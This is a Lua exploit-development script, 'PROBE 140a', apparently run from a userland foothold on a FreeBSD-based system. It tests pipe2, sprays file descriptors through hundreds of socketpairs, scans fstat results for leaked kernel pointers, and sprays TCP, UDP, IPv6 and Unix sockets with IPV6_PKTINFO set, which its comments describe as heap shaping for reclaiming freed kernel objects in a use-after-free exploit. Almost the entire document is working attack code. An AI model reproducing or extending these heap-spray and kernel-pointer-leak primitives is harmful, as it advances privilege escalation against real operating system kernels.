-- CRASH_CLASS: MODERATE
-- PROBE 140a: pipe2(542) test + fd spray for heap shaping
--
-- Context: pipe(42) via make_syscall returns fds 0,0 (dead).
-- pipe2(542) was never tested — it may use a different kernel path.
-- If pipe2 works, pipe buffers are kernel heap allocations we can
-- control the size of (via fcntl F_SETPIPE_SZ if available).
--
-- Also: massive fd spray via socketpair to exhaust fd table and
-- test kernel behavior at fd limits (potential integer overflow
-- in fd allocation, or use as heap spray primitive for UAF reclaim).

print("=== PROBE 140a: PIPE2 + FD SPRAY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h ~= 0xFFFFFFFF
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local has_rax = native and native.fcall_with_rax
local stub = has_rax and syscall.pipe.fn_addr or nil
print("has_rax=" .. tostring(has_rax ~= nil))

if not has_rax then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 140a COMPLETE ===")
    return
end

-- ============================================================
-- PHASE 1: pipe2(542) test
-- ============================================================
print("")
print("--- PHASE 1: PIPE2 TEST ---")

local pair_buf = memory.alloc(16)
safe_wq(pair_buf, uint64(0))

-- pipe2(fildes[2], flags)
-- flags: O_NONBLOCK=0x4, O_CLOEXEC=0x100000
local p1 = to_num(native.fcall_with_rax(stub, 542, to_num(pair_buf), 0))
local pfd0 = safe_rd(pair_buf)
local pfd1 = safe_rd(pair_buf + 4)
print("pipe2(0) ret=" .. p1 .. " fds=" .. (pfd0 or "nil") .. "," .. (pfd1 or "nil"))

if p1 == 0 and pfd0 and pfd0 > 0 then
    print("*** PIPE2 WORKS ***")

    -- Test write/read
    local wbuf = memory.alloc(8)
    safe_wq(wbuf, uint64(0xDEADBEEF41414141))
    local wr = to_num(native.fcall_with_rax(stub, 4, pfd1, to_num(wbuf), 8))
    print("  write ret=" .. wr)

    local rbuf = memory.alloc(8)
    safe_wq(rbuf, uint64(0))
    local rr = to_num(native.fcall_with_rax(stub, 3, pfd0, to_num(rbuf), 8))
    print("  read ret=" .. rr)
    local rv = safe_rq(rbuf)
    print("  read data=" .. fmt_addr(rv))

    -- Try fcntl F_SETPIPE_SZ (1031 on Linux, different on FreeBSD)
    -- FreeBSD doesn't have F_SETPIPE_SZ but has F_GETFL=3, F_SETFL=4
    local fl = to_num(native.fcall_with_rax(stub, 92, pfd0, 3, 0))  -- fcntl(fd, F_GETFL)
    print("  fcntl F_GETFL=" .. fl)

    -- Close pipe fds
    native.fcall_with_rax(stub, 6, pfd0)
    native.fcall_with_rax(stub, 6, pfd1)
else
    -- Try with O_NONBLOCK
    safe_wq(pair_buf, uint64(0))
    local p2 = to_num(native.fcall_with_rax(stub, 542, to_num(pair_buf), 4))
    local f0 = safe_rd(pair_buf)
    local f1 = safe_rd(pair_buf + 4)
    print("pipe2(O_NONBLOCK) ret=" .. p2 .. " fds=" .. (f0 or "nil") .. "," .. (f1 or "nil"))

    if p2 == 0 and f0 and f0 > 0 then
        print("*** PIPE2 WITH O_NONBLOCK WORKS ***")
        native.fcall_with_rax(stub, 6, f0)
        native.fcall_with_rax(stub, 6, f1)
    end

    -- Try O_CLOEXEC
    safe_wq(pair_buf, uint64(0))
    local p3 = to_num(native.fcall_with_rax(stub, 542, to_num(pair_buf), 0x100000))
    print("pipe2(O_CLOEXEC) ret=" .. p3)
end

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: FD spray via socketpair
-- ============================================================
print("")
print("--- PHASE 2: FD SPRAY ---")

-- Create as many socketpairs as possible to find fd limit
local fds = {}
local max_fds = 0
local spray_count = 0

for i = 1, 500 do
    local pb = memory.alloc(8)
    safe_wq(pb, uint64(0))
    local r = to_num(native.fcall_with_rax(stub, 135, 1, 1, 0, to_num(pb)))
    if r ~= 0 then
        print("  socketpair failed at iteration " .. i .. " ret=" .. r)
        break
    end
    local a = safe_rd(pb)
    local b = safe_rd(pb + 4)
    fds[#fds + 1] = a
    fds[#fds + 1] = b
    spray_count = i
    if b and b > max_fds then max_fds = b end

    if i % 100 == 0 then
        print("  spray: " .. i .. " pairs, max_fd=" .. max_fds)
    end
end

print("Created " .. spray_count .. " socketpairs (" .. #fds .. " fds), max_fd=" .. max_fds)

-- Check fstat on highest fd for any anomalies
if max_fds > 0 then
    local stat_buf = memory.alloc(256)
    safe_wq(stat_buf, uint64(0))
    local fs = to_num(native.fcall_with_rax(stub, 189, max_fds, to_num(stat_buf)))
    print("fstat(max_fd=" .. max_fds .. ") ret=" .. fs)

    -- Scan stat for kernel pointers
    for off = 0, 240, 8 do
        local v = safe_rq(stat_buf + off)
        if is_kptr(v) then
            print(string.format("  *** KPTR in fstat at +0x%X: %s ***", off, fmt_addr(v)))
        end
    end
end

-- Close all spray fds
for _, fd in ipairs(fds) do
    native.fcall_with_rax(stub, 6, fd)
end
print("Closed all spray fds")

print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: Socket type diversity spray (for UAF reclaim)
-- ============================================================
print("")
print("--- PHASE 3: DIVERSE SOCKET SPRAY ---")

-- Create sockets of different types/sizes for heap diversity
-- This establishes the spray technique for reclaiming freed
-- kernel objects in UAF exploits
local spray_fds = {}
local types = {
    {2, 2, 17, "UDP4"},      -- AF_INET SOCK_DGRAM UDP
    {2, 1, 6, "TCP4"},       -- AF_INET SOCK_STREAM TCP
    {28, 2, 17, "UDP6"},     -- AF_INET6 SOCK_DGRAM UDP
    {28, 1, 6, "TCP6"},      -- AF_INET6 SOCK_STREAM TCP
    {1, 1, 0, "UNIX_STREAM"},-- AF_UNIX SOCK_STREAM
    {1, 2, 0, "UNIX_DGRAM"}, -- AF_UNIX SOCK_DGRAM
}

for _, t in ipairs(types) do
    local count = 0
    for i = 1, 50 do
        local fd = to_num(native.fcall_with_rax(stub, 97, t[1], t[2], t[3]))
        if fd >= 0 then
            spray_fds[#spray_fds + 1] = fd
            count = count + 1
        else
            break
        end
    end
    print(string.format("  %s: %d sockets", t[4], count))
end

-- For IPv6 sockets, set PKTINFO to allocate pktopts (UAF target)
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local pktinfo = memory.alloc(0x20)
safe_wq(pktinfo, uint64(0))
safe_wq(pktinfo + 8, uint64(0))
safe_wd(pktinfo + 16, 0)

local pktinfo_set = 0
for _, fd in ipairs(spray_fds) do
    -- Try setting PKTINFO (only works on IPv6 sockets)
    local r = to_num(native.fcall_with_rax(stub, 105, fd, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))
    if r == 0 then pktinfo_set = pktinfo_set + 1 end
end
print("PKTINFO set on " .. pktinfo_set .. " sockets (IPv6)")

-- Check sys 624 VM counter
local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624 VM counter=" .. vm)

-- Cleanup
for _, fd in ipairs(spray_fds) do
    native.fcall_with_rax(stub, 6, fd)
end
print("Closed " .. #spray_fds .. " spray sockets")

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 140a COMPLETE ===")
